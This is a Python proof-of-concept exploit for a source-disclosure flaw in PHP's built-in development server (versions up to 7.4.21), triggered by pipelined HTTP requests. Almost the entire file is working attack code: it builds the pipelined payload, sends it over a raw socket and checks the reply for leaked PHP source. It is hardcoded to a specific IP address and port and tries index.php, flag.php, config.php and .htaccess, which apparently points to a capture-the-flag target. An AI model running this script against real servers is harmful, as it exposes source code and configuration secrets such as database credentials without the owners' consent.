#!/usr/bin/env python3
"""
PHP Development Server <= 7.4.21 - Remote Source Disclosure
CVE: N/A

This vulnerability allows attackers to disclose PHP source code instead of executing it.
The bug is in the HTTP request pipelining implementation of the PHP built-in server.

POC Request:
GET /index.php HTTP/1.1
Host: target
\r\n
GET /xyz.xyz HTTP/1.1
\r\n
\r\n
"""

import socket
import sys

def exploit(host, port, target_file):
    """
    Exploit the PHP source disclosure vulnerability using HTTP pipelining.
    """
    # Construct the pipelined request
    # First request asks for the PHP file we want to read
    # Second request asks for a non-existent file with a non-PHP extension
    payload = (
        f"GET /{target_file} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
        f"GET /xyz.xyz HTTP/1.1\r\n"
        f"\r\n"
    )
    
    print(f"[*] Targeting: http://{host}:{port}/{target_file}")
    print(f"[*] Payload:")
    print(payload.replace('\r\n', '\\r\\n\n'))
    
    try:
        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Send the pipelined request
        sock.send(payload.encode())
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        
        # Print response
        print(f"\n[+] Response ({len(response)} bytes):")
        print("=" * 60)
        
        try:
            decoded = response.decode('utf-8', errors='replace')
            print(decoded)
        except:
            print(response)
        
        # Check for PHP code disclosure
        if b'<?php' in response or b'<?' in response:
            print("\n[+] SUCCESS! PHP source code disclosed!")
        else:
            print("\n[-] No PHP source code found in response")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    # Default target
    host = "61.147.171.35"
    port = 51810
    
    # Target files to try
    target_files = [
        "index.php",
        "flag.php",
        "config.php",
        ".htaccess",
    ]
    
    print(f"[*] PHP Source Disclosure Exploit")
    print(f"[*] Target: {host}:{port}")
    print("=" * 60)
    
    for target_file in target_files:
        print(f"\n[*] Trying to disclose: {target_file}")
        exploit(host, port, target_file)
        print("\n" + "=" * 60)

if __name__ == "__main__":
    main()
